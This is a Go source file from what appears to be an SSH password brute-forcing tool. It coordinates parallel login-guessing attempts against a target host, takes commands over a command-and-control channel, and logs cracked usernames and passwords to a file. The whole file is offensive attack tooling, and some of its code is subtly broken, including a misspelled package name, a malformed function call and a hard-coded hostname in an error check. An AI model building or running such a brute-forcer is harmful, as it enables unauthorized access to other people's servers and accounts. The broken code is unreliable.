/* Hostmasters are in charge of brute-forcing a particular host.  They queue
up attempts with taskmaster. */
package main

import (
	"container/list"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
)

/* Start a series of attacks on addr. */
func hostmaster(addr string) {
	defer WG.Done()
	nRunning := 0              /* Number of active attempts */
	nMax := *gc.Htask          /* Mx number of simultanous attempts */
	var c2 chan string         /* C2 Channel, nil if !*gc.Cport */
	var doneChan chan *Attempt /* Channel for finished attempts */
	var a *Attempt             /* Attempt we're trying to start */

	/* Turn the slice of templates into a list of templates */
	tlist := list.New()
	for _, t := range TEMPLATES {
		tlist.PushBack(t)
	}

	/* Make a C2 channel if necessary */
	if *gc.Cport != "" {
		c2 = make(chan string)
		/* Try with our target as the channel name */
		if !C2CHANS.PutUnique(addr, c2) {
			log.Printf("There is already an attack in "+
				"progress against %v.", addr)
			return
		}
		/* Remove the channel when we're done */
		defer closeChannel(addr)
	}

	/* Channel on which to receive finished attempts */
	doneChan = make(chan *Attempt)

	/* Tell the user we're starting */
	/* TODO: Make verbose flag */
	//log.Printf("Starting up to %v attacks in parallel against %v",
	//      *gc.Htask, addr)

	/* Main loop */
HMLoop:
	for {
		//log.Printf("[%v] Loop: nR: %v", addr, nRunning) /* DEBUG */
		/* Send channel */
		var sc chan *Attempt
		/* Make a new attempt if we're under the limit and don't have
		   one already */
		if nil == a && (nMax <= 0 || nRunning < nMax) {
			/* Next template */
			f := tlist.Front()
			/* Don't bother if we're out of templates */
			if f != nil {
				a = f.Value.(Template).Attempt(doneChan,
					addr)
				tlist.Remove(tlist.Front())
			}
		}
		/* Work out whether to try to send or not */
		if a != nil {
			sc = TMNEW
		}
		//log.Printf("[%v] Select: nR: %v, a: %v, sc: %v", addr, nRunning, a, sc) /* DEBUG */
		select {
		case sc <- a:
			/* Sent an attempt to be attempted */
			nRunning++
			a = nil
		case c := <-c2:
			/* Got a command */
			switch {
			case c == "s": /* Stop execution */
				log.Printf("[%v] Stopping", addr)
				break HMLoop
			case strings.HasPrefix(c, "m"): /* Max attempts */
				if len(c) == 1 { /* Get */
					c2 <- fmt.Sprintf("%v", nMax)
				} else { /* Set */
					s := strings.Fields(c)[1]
					if n, err := strconv.Atoi(s); err != nil {
						log.Printf("Please report "+
							"that there is a "+
							"bug in setting "+
							"the maximum "+
							"concurrent attempts "+
							"for %v to %v: %v",
							addr, s, err)
					} else {
						nMax = n
						log.Printf("[%v] Will now "+
							"perform %v "+
							"concurrent attacks.",
							addr, n)
					}
				}
			default:
				log.Printf("Hostmaster %v command "+
					"received: %v", addr, c) /* DEBUG */
			}
		case a := <-doneChan:
			//log.Printf("[%v] Attempt done: %v", addr, *a) /* DEBUG */
			/* An attempt has finished */
			nRunning--
			/* Handle the finished attempt.  At the moment, we
			   only need to do something with the third returned
			   value. */
			ab, re, fa, un := handleFinished(a)
			//log.Printf("[%v] Attempt Handled (ab:%v re:%v fa:%v un:%v): %v", addr, ab, re, fa, un, *a) /* DEBUG */
			/* Abort */
			if ab {
				break HMLoop
			}
			/* Retry */
			if re {
				tlist.PushFront(a.Template())
			}
			/* Fail */
			if fa {
				/* Do nothing */
			}
			/* Remove User */
			if un {
				/* Iterate over templates, remove templates
				   with the user of the attempt */
				var next *list.Element
				for e := tlist.Front(); e != nil; e = next {
					next = e.Next()
					if e.Value.(Template).User ==
						a.Config.User {
						tlist.Remove(e)
					}
				}
			}
			//case <-time.After(5 * time.Minute): /* DEBUG */
			//log.Printf("[%v] Still waiting", addr) /* DEBUG */
		}
		/* Give up if we're done */
		if 0 == tlist.Len() && 0 == nRunning {
			break
		}
	}
	/* Read remaining attempts to avoid deadlock */
	go func() {
		for nRunning > 0 {
			<-doneChan
			nRunning--
		}
	}()
	log.Printf("%v Done", addr) /* DEBUG */
}

/* Handle a finished attempt.  Any logging should happen before handleFinished
returns.
Abort:  End this hostmaster (because the host is down or something like it).
Retry:  Temporary failure.  Retry attempt.
Fail:   Password didn't work, try next one.
Remuser: Success, remove attempts with this user and carry on. */
func handleFinished(a *Attempt) (abort, retry, fail, remuser bool) {
	/* If we have a success */
	if a.Err == nil {
		/* Write it to a file */
		go logSuccess(a)
		if *gc.Onepw {
			/* If we only need one user, exit */
			abort = true
			return
		} else {
			/* Otherwise, we're done with this user */
			fail = true
			remuser = true
			return
		}
	}
	/* Print error debugging information */
	if *gc.Errdb {
		log.Printf("[%v] %v@%v - %v ERROR (%T): %v", a.Tasknum,
			a.Config.User, a.Host, a.Pass, a.Err, a.Err)
	}
	/* True if the error isn't handled */
	uh := false
	/* Switch on the type of error */
	switch a.Err.(type) {
	case *net.OpError:
		abort, retry, fail, remuser, uh = handleNetOpError(a)
	case *TimeoutError:
		log.Printf("[%v] No longer attacking %v: attack timed out",
			a.Tasknum, a.Host)
		abort = true
	case error: /* Should be last */
		abort, retry, fail, remuser, uh = handleGenericError(a)
	default:
		uh = true
	}
	if uh {
		log.Printf("[%v] %v@%v - %v UNHANDLED ERROR (%T): %v",
			a.Tasknum, a.Config.User, a.Host, a.Pass, a.Err, a.Err)
		fail = true
		return
	}
	return
}

/* Log success appropriately */
func logSuccess(a *Attempt) {
	/* Print message to log */
	log.Printf("[%v] SUCCESS %v@%v - %v", a.Tasknum, a.Config.User, a.Host,
		a.Pass)
	/* Write message to file, if flagged */
	if "" == *gc.Sfile {
		return
	}
	/* Try to open the successes file */
	f, err := os.OpenFile(*gc.Sfile, os.O_WRONLY|os.O_APPEND|os.O_CREATE,
		0644)
	/* Close on return */
	defer f.Close()
	/* Give up if we can't */
	if err != nil {
		log.Printf("Unable to open successes file %v: %v", *gc.Sfile,
			err)
		return
	}
	/* Acquire an exclusive lock */
	if syscall.Flock(int(f.Fd()), syscall.LOCK_EX) != nil {
		log.Printf("Unable to lock %v: %v", *gc.Sfile, err)
		return
	}
	/* Release it when we're done */
	defer syscall.Flock(int(f.Fd()), syscall.LOCK_UN)
	/* Write line to file */
	s := fmt.Sprintf("%v@%v %v\n", a.Config.User, a.Host, a.Pass)
	r, err := f.WriteString(s)
	if err != nil {
		log.Printf("Error writing %\"%v\" to %v: %v", s, *gc.Sfile,
			err)
	}
	if r < len(s) {
		log.Printf("Only wrote %v/%v bytes of \"%v\" to %v", r, len(s),
			s, *gc.Sfile)
	}
}

/* Handle errors of type *net.OpError */
func handleNetOpError(a *Attempt) (ab, re, fa, un, uh bool) {
	estr := a.Err.Error()
	switch {
	case strings.HasSuffix(estr, "connection refused"):
		log.Printf("[%v] No longer attacking %v: connection refused",
			a.Tasknum, a.Host)
		ab = true
	case strings.HasSuffix(estr, "host is down"):
		log.Printf("[%v] No longer attacking %v: host is down",
			a.Tasknum, a.Host)
		ab = true
	case strings.HasSuffix(estr, "connection timed out"):
		log.Printf("[%v] No lonnger attacking %v: connection timed "+
			"out", a.Tasknum, a.Host)
		ab = true
	case strings.HasSuffix(estr, "too many open files"):
		log.Printf("[%v] Too many open files (or network "+
			"connections).  Consider setting -gtask to a lower "+
			"number.  Will retry %v against %v@%v.", a.Tasknum,
			a.Pass, a.Config.User, a.Host)
		re = true
	case strings.HasSuffix(estr, "no route to host"):
		log.Printf("[%v] No longer attacking %v: no route to host",
			a.Tasknum, a.Host)
		ab = true
	case strings.HasPrefix(estr, "dial tcp") &&
		strings.HasSuffix(estr, "invalid argument"):
		log.Printf("[%v] Unable to attack %v: invalid address",
			a.Tasknum, a.Host)
		ab = true
	case strings.HasPrefix(estr, "dial tcp: lookup") &&
		strings.HasSuffix(estr, ": no such host"):
		log.Printf("[%v] Unable to resolve %v", a.Tasknum, a.Host)
		ab = true
	case "dial tcp: missing port in address google.com" == estr:
		log.Printf("[%v] Unable to attack %v: missing port", a.Tasknum,
			a.Host)
		ab = true
	case strings.HasPrefix(estr, "dail tcp: lookup ") &&
		stringns.HasSuffix(": invalid domain name"):
		log.Printf("[%v] Unable to attack %v: invalid domain name",
			a.Tasknum, a.Host)
		ab = true
	default:
		uh = true
	}
	return
}

/* Handle a Generic Error.  The final parameter is true if the error hasn't
actually been handled. */
func handleGenericError(a *Attempt) (ab, re, fa, un, uh bool) {
	switch {
	case a.Err.Error() == "ssh: handshake failed: ssh: unable to "+
		"authenticate, attempted methods [none], no supported "+
		"methods remain": /* Should be first */
		log.Printf("[%v] No longer attacking %v: target does not "+
			"support password authentication", a.Tasknum, a.Host)
		ab = true
	case strings.HasPrefix(a.Err.Error(), "ssh: handshake failed: ssh: "+
		"unable to authenticate, attempted methods") &&
		strings.HasSuffix(a.Err.Error(), "no supported methods "+
			"remain"):
		fa = true
	case strings.HasSuffix(a.Err.Error(), "connection reset by peer"):
		if *gc.Rteof {
			log.Printf("[%v] Retrying %v against %v@%v after "+
				"2s: connection reset by peer", a.Tasknum,
				a.Pass, a.Config.User, a.Host)
			time.Sleep(2 * time.Second)
			re = true
		} else {
			log.Printf("[%v] No longer attacking %v: connection "+
				"reset by peer", a.Tasknum, a.Host)
			ab = true
		}
	case a.Err.Error() == "ssh: handshake failed: EOF":
		if *gc.Rteof {
			log.Printf("[%v] Retrying %v against %v@%v after "+
				"2s: EOF", a.Tasknum, a.Pass, a.Config.User,
				a.Host)
			time.Sleep(2 * time.Second)
			re = true
		} else {
			log.Printf("[%v] No longer attacking %v: EOF",
				a.Tasknum, a.Host)
			ab = true
		}
	case a.Err.Error() == "ssh: handshake failed: ssh: no common "+
		"algorithms":
		log.Printf("[%v] No longer attacking %v: no common "+
			"algorithms.", a.Tasknum, a.Host)
		ab = true
	case a.Err.Error() == "ssh: handshake failed: ssh: invalid packet "+
		"length, packet too large":
		if *gc.Rteof {
			log.Printf("[%v] Retrying %v against %v@%v after "+
				"receiving a packat that was too large.",
				a.Tasknum, a.Pass, a.Config.User, a.Host)
			re = true
		} else {
			log.Printf("[%v] No longer attacking %v: received "+
				"packet that was too large", a.Tasknum, a.Host)
			ab = true
		}
	default:
		uh = true
	}
	return
}

/* Handle close of C2 Channel */
func closeChannel(cname string) {
	/* Get the channel to be closed */
	c, ok := C2CHANS.Get(cname)
	if !ok {
		return
	}
	/* Start a goroutine to read and discard extraneous messages */
	go func() {
		ok := true
		for ok {
			_, ok = <-c.(chan string)
		}
	}()
	/* Delete the channel */
	C2CHANL.Lock()
	defer C2CHANL.Unlock()
	C2CHANS.Delete(cname)
	/* Close it to stop the goroutine */
	close(c.(chan string))
}
